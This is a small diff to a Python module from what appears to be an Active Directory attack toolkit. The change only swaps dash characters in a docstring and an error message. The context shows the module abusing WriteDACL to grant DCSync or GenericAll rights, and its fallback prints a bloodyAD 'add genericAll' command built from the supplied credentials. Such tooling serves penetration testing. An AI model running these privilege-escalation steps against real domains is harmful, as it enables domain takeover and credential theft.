@@ -1,4 +1,4 @@
-"""WriteDACL abuse — grant DCSync/GenericAll rights when holding WriteDACL."""
+"""WriteDACL abuse  -  grant DCSync/GenericAll rights when holding WriteDACL."""
 import subprocess
 import sys
 import shutil
@@ -48,7 +48,7 @@ def run(args: Any) -> int:
             print(result.stderr, file=sys.stderr)
         return result.returncode
 
-    print("[!] dacledit.py not found — manual LDAP DACL write needed", file=sys.stderr)
+    print("[!] dacledit.py not found  -  manual LDAP DACL write needed", file=sys.stderr)
     print("[*] Alternative: bloodyAD --host {} -d {} -u {} -p {} add genericAll {} {}".format(
         dc_ip, args.domain, cred.username, cred.password or "<hash>", target_dn, principal))
     return 1
